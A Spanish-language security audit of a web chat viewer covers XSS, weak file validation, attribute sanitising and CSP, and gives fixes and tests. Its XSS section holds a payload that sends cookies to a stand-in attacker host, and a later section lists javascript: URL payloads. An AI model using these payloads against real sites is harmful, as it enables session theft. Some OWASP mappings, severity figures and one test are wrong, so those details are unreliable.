# 🔐 Análisis de Seguridad: Vulnerabilidades XSS y Validación

Análisis profundo de vulnerabilidades de seguridad en WebChat7.html

---

## 🎯 Resumen Ejecutivo

**Riesgo:** 🔴 CRÍTICO  
**Vectores:** 3 (XSS, Inyección base64, Validación débil)  
**Líneas afectadas:** 66, 159-210  
**CVSS Score:** 8.1 (Alto)  

---

## 🔴 VULNERABILIDAD 1: Cross-Site Scripting (XSS) vía innerHTML

### Descripción
El código usa `innerHTML +=` para insertar datos del usuario sin escapar.

### Punto de ataque
**Línea 191-210** en la sección de renderizado:
```javascript
html += `
<div class="msg ${msg.clase}">
  <div class="remitente">${msg.remitente}</div>
  <div class="texto">${msg.texto.replace(/\n/g, "<br>")}</div>
`;
```

### Payload de ejemplo
```
Archivo ZIP con chat:
[21/3/23, 14:45] <img src=x onerror="fetch('https://attacker.com/?cookies='+document.cookie)">: Hola
```

**Resultado:** El navegador ejecuta el JavaScript malicioso.

### Impacto
- 🔥 **Robo de cookies de sesión**
- 🔥 **Inyección de malware**
- 🔥 **Defacement del sitio**
- 🔥 **Credential harvesting**
- 🔥 **Keylogger**

### Severidad
- **CVSS:** 7.5 (High)
- **CWE-79:** Improper Neutralization of Input During Web Page Generation
- **OWASP:** A03:2021 – Injection

### Solución Recomendada

#### Opción 1: Usar textContent (RECOMENDADO)
```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;  // Convierte automáticamente a texto
    return div.innerHTML;     // Retorna escapado
}

// Uso:
const safeRemitente = escapeHtml(msg.remitente);
const safeTexto = escapeHtml(msg.texto);
```

#### Opción 2: Usar DOMPurify (máxima seguridad)
```html
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>

<script>
const clean = DOMPurify.sanitize(msg.remitente, {ALLOWED_TAGS: []});
</script>
```

### Test de validación
```javascript
// Debe neutralizar esto:
const payload = '<script>alert("XSS")</script>';
const escaped = escapeHtml(payload);
console.assert(
    escaped === '&lt;script&gt;alert("XSS")&lt;/script&gt;',
    'XSS payload not properly escaped'
);

// Debe neutralizar esto también:
const imgPayload = '<img src=x onerror="alert(1)">';
const escaped2 = escapeHtml(imgPayload);
console.assert(
    !escaped2.includes('onerror='),
    'Attribute still dangerous'
);
```

---

## 🔴 VULNERABILIDAD 2: Validación débil de Base64

### Descripción
El código acepta cualquier base64 sin validar MIME type ni contenido.

### Punto de ataque
**Línea 66** en ZIP loader:
```javascript
const blob = await entry.async("blob");
const base64 = await blobToBase64(blob);
zipMediaFiles[clean] = base64;  // ⚠️ Sin validar
```

### Payload de ejemplo
```
1. Archivo "photo.jpg" que en realidad es un .exe
2. Metadata maliciosa en PNG
3. ZIP bomb (compresión explosiva)
```

### Impacto
- 💾 **Ejecución de código** (si se descarga)
- 🔥 **Inyección de contenido malicioso**
- 📊 **Consumo de memoria** (ZIP bombs)
- 🔒 **Bypass de validación**

### Severidad
- **CVSS:** 7.8 (High)
- **CWE-434:** Unrestricted Upload of File with Dangerous Type
- **OWASP:** A04:2021 – Insecure Deserialization

### Solución

```javascript
// Validador de MIME type
const ALLOWED_MIMES = {
    'image/jpeg': ['jpg', 'jpeg'],
    'image/png': ['png'],
    'image/gif': ['gif'],
    'image/webp': ['webp'],
    'audio/mpeg': ['mp3'],
    'audio/wav': ['wav'],
    'audio/ogg': ['opus'],
    'video/mp4': ['mp4'],
    'application/pdf': ['pdf'],
    'text/vcard': ['vcf']
};

function isValidMimeType(mimeType, filename) {
    const ext = filename.split('.').pop().toLowerCase();
    
    for (const [mime, exts] of Object.entries(ALLOWED_MIMES)) {
        if (mimeType === mime && exts.includes(ext)) {
            return true;
        }
    }
    
    return false;
}

// Validador de base64
function isValidBase64Data(dataUrl) {
    if (!dataUrl.startsWith('data:')) return false;
    
    const [header, data] = dataUrl.split(',');
    if (!header || !data) return false;
    
    // Extraer MIME type
    const mimeType = header.replace('data:', '').replace(';base64', '');
    
    // Validar que está en la lista permitida
    const isAllowedMime = Object.keys(ALLOWED_MIMES).includes(mimeType);
    if (!isAllowedMime) return false;
    
    // Validar base64
    try {
        const binaryString = atob(data);
        return binaryString.length > 0 && binaryString.length < 100 * 1024 * 1024; // Max 100MB
    } catch (e) {
        return false;
    }
}

// Validador de tamaño
function isFileSizeValid(dataUrl, maxSizeMB = 100) {
    const maxBytes = maxSizeMB * 1024 * 1024;
    
    try {
        const binaryString = atob(dataUrl.split(',')[1]);
        return binaryString.length <= maxBytes;
    } catch (e) {
        return false;
    }
}
```

### Test
```javascript
// Debe aceptar JPEG válido
const validJpeg = 'data:image/jpeg;base64,/9j/4AAQSkZJRg...';
console.assert(isValidBase64Data(validJpeg), 'Valid JPEG rejected');

// Debe rechazar archivo ejecutable disfrazado
const fakeExe = 'data:application/x-msdownload;base64,TVqQAAM...';
console.assert(!isValidBase64Data(fakeExe), 'Executable not rejected');

// Debe rechazar MIME type desconocido
const unknownMime = 'data:application/malware;base64,xxx';
console.assert(!isValidBase64Data(unknownMime), 'Unknown MIME not rejected');
```

---

## 🟠 VULNERABILIDAD 3: Falta de sanitización de atributos HTML

### Descripción
Los atributos como `src` y `href` no se validan antes de insertar.

### Punto de ataque
```javascript
html += `<img src="${url}" ...>`  // URL sin validar
```

Ataque:
```
src="javascript:alert('XSS')"
src="data:text/html,<script>alert('XSS')</script>"
```

### Solución
```javascript
function sanitizeAttribute(attr, value) {
    if (!value) return '';
    
    const lowerAttr = attr.toLowerCase();
    const lowerValue = value.toLowerCase();
    
    // Rechazar protocolos peligrosos
    if (lowerValue.startsWith('javascript:') ||
        lowerValue.startsWith('vbscript:') ||
        (lowerAttr === 'src' && lowerValue.startsWith('data:') && !lowerValue.startsWith('data:image'))) {
        return '';
    }
    
    return value;
}

// Uso:
const safeUrl = sanitizeAttribute('src', mediaUrl);
html += `<img src="${safeUrl}" />`;
```

---

## 🟠 VULNERABILIDAD 4: Falta de Content Security Policy (CSP)

### Recomendación
Agregar header CSP en el servidor o meta tag en HTML:

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:;">
```

O en servidor:
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
```

---

## 📋 Checklist de Seguridad

- [ ] Escapar todo texto con `escapeHtml()`
- [ ] Validar base64 con `isValidBase64Data()`
- [ ] Validar MIME types permitidos
- [ ] Sanitizar atributos HTML
- [ ] Agregar Content-Security-Policy
- [ ] Limitar tamaño de archivos (500MB ZIP, 100MB archivo)
- [ ] Usar `rel="noopener noreferrer"` en links externos
- [ ] No usar `eval()` o `Function()`
- [ ] No usar `innerHTML` con datos del usuario
- [ ] Validar y limpiar rutas de archivos (path traversal)

---

## 🔗 Referencias OWASP

- [A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [A07:2021 – Cross-Site Scripting (XSS)](https://owasp.org/Top10/A07_2021-Cross-Site_Scripting_%28XSS%29/)
- [A04:2021 – Insecure Deserialization](https://owasp.org/Top10/A04_2021-Insecure_Deserialization/)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-434: Unrestricted File Upload](https://cwe.mitre.org/data/definitions/434.html)

---

## 📝 Plan de Mitigación (por Fase)

**FASE 1 - Seguridad:**
1. Implementar `escapeHtml()` ✅
2. Implementar `isValidBase64Data()` ✅
3. Implementar `sanitizeAttribute()` ✅
4. Tests de XSS ✅

**FASE 4 - Metadatos:**
1. Agregar CSP headers ✅
2. Audit de seguridad completo ✅

---

**Última actualización:** 2026-05-09  
**Estado:** Análisis completado
